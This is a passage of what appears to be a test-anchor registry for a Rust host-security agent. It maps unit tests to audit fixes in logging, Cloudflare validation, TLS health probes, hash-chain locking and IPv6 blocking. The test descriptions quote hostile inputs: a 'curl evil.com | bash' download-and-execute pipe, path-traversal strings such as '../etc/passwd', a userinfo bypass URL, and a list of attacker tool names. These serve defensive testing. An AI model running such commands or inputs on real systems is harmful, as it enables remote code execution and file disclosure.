- `crates/sensor/src/collectors/nginx_access.rs::tests::run_retries_quietly_on_persistent_missing_file` - exercises the `Err` arm under paused tokio time so the 5-second retry sleep is virtual. Anchors that the collector survives a missing file across multiple iterations without panicking. Pairs with the unit tests on `log_instruction_for` for the verdict-to-level mapping.

- `crates/sensor/src/collectors/nginx_error.rs::tests::run_emits_event_for_existing_error_line` - same `Ok`-arm anchor as nginx_access, on the error log collector. Tempfile with a `[error]` line carrying a client IP must produce one `http.error` event.

- `crates/sensor/src/collectors/nginx_error.rs::tests::run_retries_quietly_on_persistent_missing_file` - same `Err`-arm anchor as nginx_access, on the error log collector.

### Tracing journald priority (Wave 9f - AUDIT-009 root)

- `crates/agent/src/tests::use_journald_layer_returns_true_when_journal_stream_is_set` - `use_journald_layer` returns true iff the binary is being captured by systemd's journal stream (detected via the `JOURNAL_STREAM=<dev>:<inode>` env var). Pinned the 2026-05-04 audit AUDIT-009: pre-fix `journalctl -p warning` silently dropped every WARN this crate emitted because `tracing-subscriber`'s fmt layer wrote plain text to stdout with no `PRIORITY=` field. Wave 9f routes tracing through `tracing-journald` when this returns true, which sets PRIORITY based on the tracing level via `sd_journal_send`.

- `crates/agent/src/tests::use_journald_layer_returns_false_when_env_is_unset` — off-systemd dev shell + macOS dev: env var absent, `use_journald_layer` returns false so the binary does NOT try to write to a non-existent journal socket (would fail at startup on macOS where there is no `/run/systemd`).

- `crates/agent/src/tests::use_journald_layer_returns_false_when_env_is_empty_string` — defensive: `JOURNAL_STREAM=` (empty) is treated as unset. Anti-regression for an operator's foreground run silently attempting a journald write that fails.

- `crates/agent/src/tests::build_tracing_env_filter_includes_innerwarden_directives` — the env filter MUST enable both `innerwarden_agent` (the actual code) and `telegram_audit` + `innerwarden_store` (sub-namespaces previous PRs explicitly opted into — PR #357 and the audit-ui spec). Dropping any of these silently turns off operator-visible logs for the affected subsystem.

- `crates/sensor/src/tracing_init.rs::tests::use_journald_layer_returns_true_when_journal_stream_is_set` — same contract on the sensor side.

- `crates/sensor/src/tracing_init.rs::tests::use_journald_layer_returns_false_when_env_is_unset` — same defensive case for sensor.

- `crates/sensor/src/tracing_init.rs::tests::use_journald_layer_returns_false_when_env_is_empty_string` — same empty-env defensive case for sensor.

- `crates/sensor/src/tracing_init.rs::tests::build_tracing_env_filter_includes_innerwarden_sensor_directive` — the sensor's env filter MUST enable the `innerwarden_sensor` namespace; dropping it silently turns off most logs. (Moved out of crates/sensor/src/main.rs in PR #801 — 2026-05-25 main.rs decomposition step 1.)

### Cloudflare CIDR validation (Wave 9g — AUDIT-017 anchor)

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_bare_ipv4` — bare IPv4 / IPv6 addresses (no prefix) pass the validator. Cloudflare's IP Access Rules API treats them as host-targeted blocks; the validator must not require a prefix.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_documented_ipv4_widths` — only `/16`, `/24`, `/32` are accepted for IPv4 per Cloudflare docs. Anchor against accidentally adding /20 / /28 / etc to the allowlist (would re-introduce AUDIT-017 silent failures).

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_undocumented_ipv4_widths` — pins the EXACT prod failure shape from 2026-05-04: `/22`, `/8`, `/12`, `/20`, `/27`, `/0` all rejected. Pre-fix these wasted an HTTP round trip and got `firewallaccessrules.api.validation_error: invalid ip provided`. Post-fix they short-circuit at the agent boundary.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_documented_ipv6_widths` — IPv6 supports `/32`, `/48`, `/64` per Cloudflare. Distinct rules from IPv4; pin them.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_undocumented_ipv6_widths` — `/128` (single IPv6) is technically a CIDR but Cloudflare expects bare IPv6 for hosts; reject `/128` so callers use the bare form. Also rejects `/16`, `/24`, `/56` (valid for IPv4 but not IPv6) — the validator must keep the family rules separate.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_garbage_input` — defensive: empty, whitespace, non-IP, broken CIDR, missing prefix, missing host all rejected. Anti-regression for accidentally allowing `parse::<IpAddr>` on a partial string.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_trims_surrounding_whitespace` — operator config / CLI often emits stray whitespace; trim before validating so a copy-pasted IP with a trailing newline does not get rejected as malformed.

### Local classifier safety net (Wave 9g — AUDIT-016 anchor)

- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_without_ip_entity_is_downgraded_to_ignore` — when the classifier predicts `block_ip` but the incident has no IP entity, the resulting action MUST be `Ignore` (NOT `BlockIp`). Pinned the 2026-05-04 audit AUDIT-016 finding: the safety-net downgrade is intended behaviour, not an operator-actionable WARN. Removing the downgrade would let the classifier produce a structurally invalid `BlockIp` action with no IP target.

- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_with_ip_entity_produces_block_ip` — when the IP IS present, the action MUST be `BlockIp`. Anti-regression for over-eagerly downgrading.

- `crates/agent/src/ai/local_classifier.rs::tests::monitor_without_ip_uses_unknown_placeholder` — documents the existing fallback for `monitor` predictions without an IP (uses `"unknown"`); future contributors cannot drop the unwrap_or without changing the public action shape.

- `crates/agent/src/ai/local_classifier.rs::tests::unknown_action_name_falls_back_to_ignore` — if a future model adds a label we don't recognise, the agent MUST fall back to `Ignore` (no panic, no partial decision). Confidence stays in the reason string for audit visibility.

- `crates/agent/src/ai/local_classifier.rs::tests::dismiss_includes_confidence_in_reason_string` — audit-trail anchor: the reason for a `Dismiss` action must include the confidence so the operator can grep `dismiss (confidence 0.` for low-confidence dismisses without re-querying the inference batch.

### Supervisor HTTPS health probe (PR α - AUDIT-005 anchor)

- `crates/supervisor/src/health.rs::tests::loopback_https_url_triggers_skip_verify` - constructing a `HealthChecker` with `https://127.0.0.1:8787` sets `skip_tls_verify=true` so the probe accepts a self-signed cert. Pinned the 2026-05-04 prod incident where the watchdog probed `http://127.0.0.1:8787` against an HTTPS-serving agent and accumulated 1100+ consecutive failures over ~10 hours, SIGKILLing a healthy agent every 30 s.

- `crates/supervisor/src/health.rs::tests::loopback_https_localhost_triggers_skip_verify` - same anchor with `localhost` host; defensive against an operator-supplied URL that does not literally use the IP.

- `crates/supervisor/src/health.rs::tests::loopback_https_ipv6_triggers_skip_verify` - IPv6 loopback `[::1]` is also recognised as loopback. Anti-regression for an IPv4-only matcher that would silently demote IPv6-host watchdog deployments.

- `crates/supervisor/src/health.rs::tests::http_loopback_does_not_skip_verify` - plain HTTP keeps `skip_tls_verify=false`. Anti-regression for accidentally widening the skip path to plain HTTP, which is a pointless toggle and might mask other config errors.

- `crates/supervisor/src/health.rs::tests::non_loopback_https_keeps_verify_on` - HTTPS to a non-loopback host (`10.0.0.5`, `example.com`) keeps verification ON. Anti-regression for "auto-disable on every HTTPS" which would erase the cert protection on a remote watchdog probe.

- `crates/supervisor/src/health.rs::tests::url_is_loopback_https_handles_path_and_userinfo` - URL parsing tolerates `userinfo@`, query strings, and `/path` suffixes without losing the host comparison.

- `crates/supervisor/src/health.rs::tests::url_is_loopback_https_rejects_lookalike_hosts` - the matcher uses exact host equality, NOT prefix or substring match. Anti-regression for a future "starts_with" shortcut that would let an attacker-controlled `127.0.0.1.attacker.com` skip TLS verification.

### Agent /livez liveness endpoint (PR α2 - AUDIT-005 follow-up anchor)

- `crates/agent/src/dashboard/mod.rs::tests::js_livez_endpoint_is_unauthenticated` - the `/livez` route returns 200 OK without Basic Auth, regardless of whether the dashboard is bound to loopback or non-loopback. Pinned the AUDIT-005 follow-up: the supervisor's health probe got 401 from `/metrics` even after the HTTPS fix because every agent endpoint required auth on non-loopback bind. `/livez` is the contract that splits "process alive" from "operator can read counters".

- `crates/agent/src/dashboard/mod.rs::tests::js_livez_endpoint_returns_constant_body` - the body is exactly `ok\n` with no JSON, no state, no per-host info. Anti-regression for accidentally turning `/livez` into a verbose status page that leaks deployment details to unauthenticated probes.

- `crates/supervisor/src/health.rs::tests::probe_path_is_livez_not_metrics` - the supervisor probes `<agent_api>/livez`, NOT `/metrics`. Anti-regression for a "let's reuse /metrics" simplification that would re-introduce the AUDIT-005 401 false-alarm against any non-loopback bind.

### CL-008 self-traffic suppression (PR ε - AUDIT-CL008-SELF anchor)

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppressed_when_originating_comm_is_innerwarden_agent` - eBPF events with `comm = innerwarden-age` (the truncated form the kernel actually emits for `innerwarden-agent`) are dropped from CL-008 chain matching. Pinned the 2026-05-04 prod incident where the agent's outbound to AbuseIPDB / threat feeds / Telegram was being correlated as Data Exfiltration and blocked via UFW.

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppressed_when_originating_comm_is_tokio_rt_worker` - eBPF events with `comm = tokio-rt-worker` are dropped. The agent's HTTP / Redis / DNS calls all run on these threads; without this carve-out every outbound call from the agent triggered CL-008.

- `crates/agent/src/correlation_engine.rs::tests::innerwarden_binary_self_traffic_suppression_is_rule_agnostic` - the InnerWarden binary-name carve-out (`innerwarden-age` etc.) applies to EVERY rule. Anti-regression for accidentally scoping the new list to CL-008 only via `rule_comm_suppressions`.

- `crates/agent/src/correlation_engine.rs::tests::tokio_rt_worker_only_suppressed_on_cl008_not_other_rules` - the `tokio-rt-worker` carve-out is CL-008-specific. Anti-regression for promoting `tokio-rt-worker` to `INNERWARDEN_SELF_COMMS`, which would create a workspace-wide blind spot for any Tokio-based malware (the thread name is generic, not InnerWarden-specific).

- `crates/agent/src/correlation_engine.rs::tests::self_traffic_suppression_does_not_match_full_untruncated_names` - the list pins the truncated kernel-truth shape (`innerwarden-age`, NOT `innerwarden-agent`). Anti-regression for someone "fixing" the truncation by adding the full names too.

- `crates/agent/src/correlation_engine.rs::tests::self_traffic_suppression_keeps_real_attacker_comms_alive` - common attacker tooling (`curl`, `wget`, `nc`, `python3`, `perl`, `ssh`, `bash`) is NOT in the suppression list. The carve-out is a tight allowlist, not a hole that disables CL-008.

### UTF-8 panic class (Wave 1 - AUDIT-WAVE1-UTF8 anchor)

- `crates/agent/src/text_util.rs::tests::multibyte_split_at_char_boundary_does_not_panic` - `safe_truncate` walks back to a UTF-8 char boundary instead of panicking on `&s[..N]`. Pinned the 2026-05-04 ultrareview class where 8 call sites (AI prompt builders, KG edge summary, agent-guard alert, Telegram alert, kill-chain stdout, honeypot SSH history) all DoSed on attacker-supplied multi-byte input.

- `crates/agent/src/text_util.rs::tests::three_byte_codepoint_splits_walk_back_correctly` - 3-byte codepoint (`€`) walked back correctly when `max` lands on byte 1 or 2.

- `crates/agent/src/text_util.rs::tests::four_byte_codepoint_emoji_splits_walk_back_correctly` - 4-byte codepoint (🦀) walked back correctly. Anti-regression for an attacker shipping emoji at exactly the truncation boundary.

- `crates/agent/src/text_util.rs::tests::long_attacker_string_with_max_inside_multibyte_does_not_panic` - realistic prod shape: `€` repeated 100 times truncated at byte 200 returns 198 bytes (66 codepoints) without panicking.

- `crates/agent/src/text_util.rs::tests::mixed_ascii_and_multibyte_truncates_at_the_first_unsplittable_boundary` - ASCII+multibyte mixed string truncates at the boundary before the unsplittable codepoint, never inside it.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_does_not_panic_on_multibyte_after_172_dot` - the `validate_action_params` 172.x check no longer does byte-slice `t[4..6]` (which panicked on `172.€16.0.1`-shaped attacker input). Now uses `split('.').nth(1).parse::<u8>()`, which is panic-free.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_allows_172_165_which_is_not_rfc1918` - anti-regression for the silent operator-impacting bug the byte-slice fix also resolved: `172.165.0.1` is in the PUBLIC range and must NOT be blocked. Pre-fix `t[4..6] = "16"` falsely matched the private range.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_still_blocks_real_172_16_through_172_31` - pins the RFC1918 172.16.0.0/12 block range so a future "fix" that off-by-ones the boundary fails at test time.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_allows_172_15_and_172_32_at_range_edges` - `172.15.0.1` and `172.32.0.1` are public and must pass.

### Security bypass class (Wave 2 - AUDIT-WAVE2 anchors)

- `crates/core/src/sudo_guard.rs::tests::sanitize_replaces_includedir_skip_chars` - sudo's `includedir /etc/sudoers.d` silently skips files containing `.` or ending in `~` (sudoers(5)). Real Linux usernames like `john.doe` were producing deny-rule filenames that sudo skipped, making the suspension a silent no-op. The sanitiser replaces `.`/`~` with `_` in the FILENAME only (the rule body keeps the real username so sudo matches the right account), and leaves the safe charset (`_`/`-`/`$` SAMBA accounts) untouched so it never mangles a legitimate username. Moved here from `suspend_user_sudo.rs` (2026-07-03): the sanitiser is now the single source of truth in `innerwarden_core::sudo_guard`, shared by the agent skill and the privileged `__sudo-suspend` helper.
- `crates/core/src/sudo_guard.rs::tests::deny_file_path_is_sanitized_and_under_sudoers_d` - the composed deny-file path applies that sanitiser (`john.doe` → `/etc/sudoers.d/zz-innerwarden-deny-john_doe`), so the same includedir-skip bug cannot re-enter through the path builder the root helper and agent both call.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_downloader_in_middle_segment` - `check_download_execute_pipe` scans for the downloader in ANY pipe segment (not only `parts[0]`). The pre-fix `parts[0]`-only check was trivially evaded by `cmd | curl evil.com | bash`.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_executor_before_downloader` - temporal correctness: an executor BEFORE the downloader is not a download-and-execute chain. Anti-regression for a future "any executor anywhere" simplification that would over-trigger.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_downloader_without_subsequent_executor` - `curl evil.com | tee out.txt` (download + non-executor) must NOT trip this specific detector.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_double_pipe_with_only_downloader` - downloader followed by non-executor pipes (`grep | wc`) must not trigger.

### AbuseIPDB burst cap bypass (Wave 3 - AUDIT-WAVE3-BURST-CAP anchor)

- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_within_cap_bypasses_pre_fix_but_now_caps_correctly` - the headline anchor: counter at 750, cap 800, batch of 100 ready items. Pre-fix planned 100 sends (all read counter=750 < 800), post-fix plans 50 sends + 50 skips with `DailyCapReached`. The in-batch counter `planned_sends_this_batch` short-circuits the cap before the batch dispatches.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_keeps_normal_within_cap_passing_when_no_burst` - 5 items at counter 0 cap 800 must all Send. Anti-regression for the in-batch counter accidentally double-counting.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_exactly_at_remaining_cap_lands_no_skips` - boundary: counter 798, cap 800, batch of 2. Both Send.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_one_over_remaining_cap_skips_the_overflow` - same boundary + 1: batch of 3 produces 2 sends + 1 skip.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_with_cloud_safelist_does_not_consume_cap` - cloud-safelist hits go to `SkipCloud`, NOT `Send`, so they MUST NOT consume `planned_sends_this_batch` slots. Anti-regression for accidentally bumping the in-batch counter before the safelist short-circuit.

### Sync I/O in async cleanup_expired_* (Wave 3 - AUDIT-WAVE3-SYNC-IO anchor)

- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_returns_only_expired_entries` - the pure-sync helper `enumerate_expired_suspensions_sync` filters expired entries, removes corrupt JSON inline, ignores non-`.json` files, and retains fresh entries. Pinned the 2026-05-04 ultrareview class where 3 async cleanup_expired_* fns blocked the tokio runtime via `std::fs::read_dir` + per-file `std::fs::read_to_string`. The fix offloads enumeration to `spawn_blocking` and routes per-entry deletes through `tokio::fs::remove_file`.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_empty_dir_returns_empty_vec` - empty dir does not error, returns empty vec.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_missing_dir_errors_with_context` - missing dir errors with the `read_dir <path>` context the caller can log usefully.
- `crates/agent/src/skills/builtin/rate_limit_nginx.rs::tests::enumerate_expired_nginx_blocks_returns_only_expired_entries` - same contract for the nginx variant.
- `crates/agent/src/skills/builtin/rate_limit_nginx.rs::tests::enumerate_expired_nginx_blocks_empty_dir` - empty dir non-error path.
- `crates/agent/src/skills/builtin/block_container.rs::tests::enumerate_expired_container_blocks_returns_only_expired_entries` - same contract for the container variant.
- `crates/agent/src/skills/builtin/block_container.rs::tests::enumerate_expired_container_blocks_includes_non_pause_actions` - the helper returns non-pause expired entries too (the async caller branches on `action` after enumeration). Anti-regression for filtering them at the helper layer.

### Decisions hash-chain race (Wave 3 - AUDIT-WAVE3-CHAIN-RACE anchor)

- `crates/agent/src/decisions.rs::tests::concurrent_append_chained_does_not_fork_the_hash_chain` - 4 OS threads each calling `append_chained` 25 times against the same data_dir produce a strictly-linear chain (no two entries share a non-None `prev_hash`, every `prev_hash` matches its predecessor's SHA-256). Pinned the 2026-05-04 ultrareview class where `DecisionWriter::write` and `append_chained` both did `read_last_hash` then `writeln!` without a file lock, letting two concurrent appenders produce a forked chain. The fix routes both writers through `append_chained_locked` which holds `flock(LOCK_EX)` over the read-hash + write + flush sequence.
- `crates/agent/src/decisions.rs::tests::append_chained_persists_entries_in_strict_serialization_order` - single-threaded baseline: 5 sequential appends produce 5 lines forming a strict prev_hash → hash chain. Anti-regression for accidentally introducing batching that violates the one-entry-per-flush invariant.
- `crates/agent/src/decisions.rs::tests::struct_writer_and_append_chained_share_one_linear_chain` - cross-path interleave: 5 writes split across `DecisionWriter::write` (BufWriter struct path) and bare `append_chained` (honeypot path) produce one linear chain. Anti-regression for the always-on honeypot vs slow-loop race that motivated the original ultrareview finding.
- `crates/agent/src/decisions.rs::tests::is_iso_date_rejects_path_traversal_shapes` - `is_iso_date` rejects `../etc/pwd`, `..\\windows`, NUL injection, and slash-instead-of-dash variants. Pin so a future "loosen the validator to accept yyyy/mm/dd" tweak fails CI loudly - the validator is the CodeQL-visible CWE-22 sanitiser for the daily JSONL filename.
- `crates/agent/src/decisions.rs::tests::append_chained_locked_refuses_non_iso_date_segment` - the validator fires BEFORE any open()/lock() syscall when a non-ISO-date segment (e.g. `../etc/passwd`) is passed. Anti-regression for accidentally moving the check after the path is constructed.
- `crates/agent/src/decisions.rs::tests::is_iso_date_rejects_path_traversal_and_garbage` - the `today` segment of the daily-JSONL path is validated to `\d{4}-\d{2}-\d{2}` before any filesystem call. Anti-regression for accidentally letting attacker-controlled input reach the path-construction layer (CodeQL CWE-22 path traversal). Tests every shape an attacker would try: `../etc/passwd`, `2026-05-04\0`, `2026-05-*`, leading/trailing spaces, wrong digit widths.

### IPv6/IPv4 holes (Wave 4 - AUDIT-WAVE4 anchor)

- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv6_addresses` - the headline anchor: `xdp_unblock_ip` no longer assumes IPv4. A v6 unblock routes to `BLOCKLIST_V6_PIN` with 16 key bytes. Pre-fix any IPv6 entry that `execute()` inserted into the v6 map was never removed even after the operator (or TTL sweep) requested removal.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv4_addresses` - anti-regression: v4 unblock still routes to `BLOCKLIST_PIN` with 4 key bytes.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv6_loopback` - `::1` (15 zero bytes + `1`) parses correctly.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_rejects_garbage_input` - invalid input (non-IP, malformed v4/v6) is rejected with a clear error.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_blocklist_pin_for_ip_routes_v4_and_v6_to_distinct_maps` - `xdp_blocklist_pin_for_ip` returns the IPv4 pin path for an `Ipv4Addr` shape and the IPv6 pin path for an `Ipv6Addr` shape, with no overlap. Anti-regression for accidentally collapsing the two maps in a future refactor (which would silently break IPv6 unblock — the actual prod failure mode).
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_blocklist_pin_for_ip_returns_none_for_garbage` - the helper returns `None` on non-IP input so callers can drop the local poison entry without invoking `bpftool`. Pin the contract that the boot-loop TTL expiry path depends on.
- `crates/agent/src/loops/boot.rs::tests::xdp_ttl_cleanup_calls_v6_pin_for_ipv6_entries` - the boot-loop TTL expiry path (the actual prod path for adaptive XDP unblock) routes IPv6 entries through `BLOCKLIST_V6_PIN` instead of dropping them as "poison". Pre-fix the loop did `ip.parse::<Ipv4Addr>()` and called `state.xdp_block_times.remove(ip)` on every IPv6 entry, leaving the kernel `BLOCKLIST_V6_PIN` map populated forever — even after the TTL expired.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_with_port_and_path` - the headline anchor: `extract_url_host("[::1]:11434/api/generate")` returns `"::1"`. Pre-fix the splitting strategy returned `"["` and `validate_ai_base_url` rejected every operator running a local IPv6 LLM endpoint.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_no_port` - `[::1]` and `[::1]/api` round-trip too.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_with_full_address` - `[2001:db8::1]:443/v1` extracts `2001:db8::1`.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_strips_userinfo_before_authority_split` - `user@host` and `user:pass@host` produce `host`, not `user`. Pre-fix `extract_url_host("localhost:pw@evil.example")` returned `"localhost"` (split-on-`:`-first) and `validate_ai_base_url("http://localhost:pw@evil.example")` accepted the URL as loopback even though the real authority is `evil.example`. Anti-regression for the URL-userinfo-bypass class on the AI-base-URL HTTP gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_rejects_userinfo_bypass_remote` - end-to-end: `http://localhost:pw@evil.example` is REFUSED, not silently accepted. Anti-regression for the same userinfo bypass on the high-level gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_accepts_ipv6_loopback_http_with_port_and_path` - end-to-end: every shape an operator running Ollama / vLLM on IPv6 loopback would write (`http://[::1]:11434/api/generate`) now passes the gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_still_accepts_existing_loopback_forms` - anti-regression: `localhost` and `127.0.0.1` still work.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_still_rejects_remote_http` - anti-regression: tightening the host extractor must NOT weaken the security gate. Remote HTTP (any non-loopback host, including remote IPv6 like `[2001:db8::1]`) is still refused.

### Doc drift (Wave 5 - AUDIT-WAVE5-DOC-DRIFT anchor)

- `crates/agent/src/dashboard/auth.rs::tests::threat_model_md_quotes_actual_global_rate_limit` - THREAT_MODEL.md quotes the literal `GLOBAL_RATE_LIMIT_PER_MIN` value. Anti-regression: pre-fix the doc said `120 req/min/IP` while the constant was 300; CI now fails if the two diverge so a future bump must update both.
- `crates/agent/src/dashboard/auth.rs::tests::security_md_supported_versions_matches_current_minor` - SECURITY.md lists the current `vMAJOR.MINOR.x` line as supported. Pre-fix it still said `v0.1.x` at v0.13.0. CI fails on every minor bump until SECURITY.md is also updated.
- `crates/agent/src/dashboard/auth.rs::tests::threat_model_md_does_not_quote_stale_rate_limit_value` - partial-edit anti-regression: walks every `<N> req/min/IP` shape in THREAT_MODEL.md and asserts each matches `GLOBAL_RATE_LIMIT_PER_MIN`. A future bump that updates only ONE doc mention while leaving a stale duplicate fails CI loudly.
- `crates/agent/src/dashboard/auth.rs::tests::security_md_lists_only_current_minor_as_supported` - partial-edit anti-regression: walks every "Yes"-marked row in the SECURITY.md supported-versions table and asserts the version token matches the current `CARGO_PKG_VERSION` minor. A future minor bump that adds the new row but leaves a stale `v0.X.x | Yes` line elsewhere fails CI — older lines must be `No`.

### String interning hot paths (Wave 6 - AUDIT-WAVE6-INTERN anchor)

- `crates/agent/src/correlation_engine.rs::tests::correlation_event_source_and_kind_share_arc_allocations` - 1000 `CorrelationEvent` instances built from raw `Event` shapes that share `source="auth_log"` and `kind="ssh.login_failed"` produce a window where every entry's `source` and `kind` `Arc<str>` is pointer-equal to entry [0]'s. Anti-regression for reverting either field back to `String` (which would silently allocate 1000 independent heap copies, defeating the Wave 6 win on the 10 000-entry `event_window`).

### String interning hot paths v2 (Wave 6b - AUDIT-WAVE6B-INTERN anchor)

- `crates/agent/src/telemetry.rs::tests::observe_events_interns_collector_key_via_arc_str` - 1000 events with `source="auth_log"` produce a `events_by_collector` BTreeMap with ONE entry whose key is pointer-equal to `intern("auth_log")`. Anti-regression for reverting `events_by_collector: BTreeMap<Arc<str>, u64>` back to `BTreeMap<String, u64>` (which would silently allocate-and-drop 1000 fresh Strings on the per-event hot path).
- `crates/agent/src/telemetry.rs::tests::telemetry_snapshot_arc_str_keys_round_trip_through_json` - JSON serialize → deserialize round-trip on `TelemetrySnapshot` keeps the wire format identical to pre-Wave-6b (keys appear as plain JSON strings). Anti-regression for accidentally serializing `Arc<str>` as a tagged structure that would break older agents reading the same telemetry file.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_current_hour_counts_key` - 1000 events with `source="auth_log"` produce a `current_hour_counts` HashMap with ONE entry pointer-equal to `intern("auth_log")`. Same pattern as the telemetry anchor — proves the per-event interning is wired at the baseline insert site.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_user_login_hours_key` - 100 successful logins for `ubuntu` produce one `user_login_hours` entry whose key is pointer-equal to `intern("ubuntu")`. Anti-regression for reverting the username key type, which would re-introduce per-login `String` churn even though only ~50 distinct usernames exist on a typical host.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_process_lineages_member` - 200 events for the same `parent→child` lineage produce ONE `process_lineages` set member pointer-equal to `intern("parent→child")`. Pins the interning on the lineage write path; lineage strings repeat across every observed event from the same parent chain.
- `crates/agent/src/baseline.rs::tests::baseline_store_arc_str_keys_round_trip_through_json` - JSON serialize → deserialize on `BaselineStore` preserves keys as plain strings on disk. Pre- and post-Wave-6b agents must be able to load the same `baseline.json`.

### String interning hot paths v3 (Wave 6c - AUDIT-WAVE6C-INTERN anchor)

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::record_event_telemetry_interns_source_and_kind_keys` - 1000 calls to `record_event_telemetry("auth_log", "ssh.login_failed", _)` produce `KnowledgeGraph::source_counts` and `KnowledgeGraph::kind_counts` HashMaps each with ONE entry, pointer-equal to `intern("auth_log")` / `intern("ssh.login_failed")`. Anti-regression for reverting the KG event-telemetry counter map types from `HashMap<Arc<str>, usize>` back to `HashMap<String, usize>` — that revert would silently re-introduce per-event String churn on the ingest hot path.
- `crates/agent/src/knowledge_graph/ingestion.rs::tests::record_event_telemetry_interns_event_timeline_keys` - 200 calls at the same bucket produce a `event_timeline: BTreeMap<Arc<str>, HashMap<Arc<str>, _>>` with ONE outer entry whose key is pointer-equal to `intern(<bucket>)` AND ONE inner entry whose key is pointer-equal to `intern("auth_log")`. Pins both axes of the nested map; reverting either fails the test.

### Cloudflare attribution rewrite (Wave 9 - AUDIT-WAVE9-CF-ATTRIBUTION anchor)

- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_header_present` - the HTTP parser extracts `CF-Connecting-IP` (canonical casing) into `HttpRequest::cf_connecting_ip`. Anti-regression for accidentally dropping the header on a future parser refactor — without this field the agent's CF rewrite is a no-op.
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_header_lowercase` - lowercase `cf-connecting-ip` parses too (HTTP header names are case-insensitive per RFC 7230).
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_absent_yields_empty_string` - when the header is missing the field is empty, NOT a sentinel — agent treats empty as "header absent" and falls back to socket-peer attribution.
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_x_forwarded_for_keeps_raw_chain` - `X-Forwarded-For: <client>, <proxy>` is preserved raw — splitting/policy is the agent's responsibility.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_thirty_two_cf_edges_resolve_to_one_real_client` - the headline anchor: 8 representative CF edge IPs (from the real 2026-05-05 prod incident) all sharing one `CF-Connecting-IP=203.0.113.42` resolve to ONE client. Pre-Wave-9 the same scanner via CF appeared as 32 separate attackers on Threats / 32 CF datacenter pins on the public map.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_non_cf_peer_with_spoofed_header_is_rejected` - the security anchor: a non-CF peer (8.8.8.8) setting `CF-Connecting-IP: 127.0.0.1` does NOT trigger rewrite. Defence against attacker-supplied spoofed headers; trust gate is `is_cloudflare_edge_ip(socket_peer)`.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_cf_peer_without_header_is_not_rewritten` - CF socket peer without the header → no rewrite (keep CF edge IP as attribution; never falsify via XFF).
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_malformed_cf_header_is_rejected` - `cf_connecting_ip: "../etc/passwd"` is rejected. An attacker who somehow got onto a CF edge peer cannot inject non-IP shapes to break downstream geo/block logic.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_missing_src_ip_does_not_panic` - defensive: events with no `src_ip` field don't panic the rewrite path (production never produces these but a malformed event must not crash the loop).
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_recognises_every_cloudflare_cidr_range` - one representative IP from each of the 14 published CF CIDR ranges classifies as a CF edge. If CF publishes a new range, both `CLOUDFLARE_RANGES` (constant) and this test must update in lockstep.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rejects_aws_azure_oracle_as_cf_edges` - random non-CF IPs (Google DNS, AWS CloudFront, Azure, Oracle, loopback) are NOT classified as CF edges. Anti-regression for accidentally widening the trust gate.
